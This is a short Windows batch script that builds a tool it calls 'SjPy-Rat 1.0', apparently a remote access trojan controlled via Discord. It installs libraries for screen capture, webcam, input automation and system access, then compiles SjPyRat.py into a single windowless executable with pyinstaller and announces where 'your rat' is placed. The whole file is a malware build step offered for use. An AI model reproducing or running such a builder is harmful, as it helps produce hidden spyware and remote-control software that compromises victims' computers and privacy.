@echo off
title SjPy-Rat 1.0 (by create vza3464)
pip install discord.py
pip install pyautogui
pip install pywin32
pip install psutil
pip install pygame
pip install opencv-python
pip install requests
pip install pyinstaller

pyinstaller --onefile --noconsole SjPyRat.py
cls
echo Your rat is located in the "dist" folder.
pause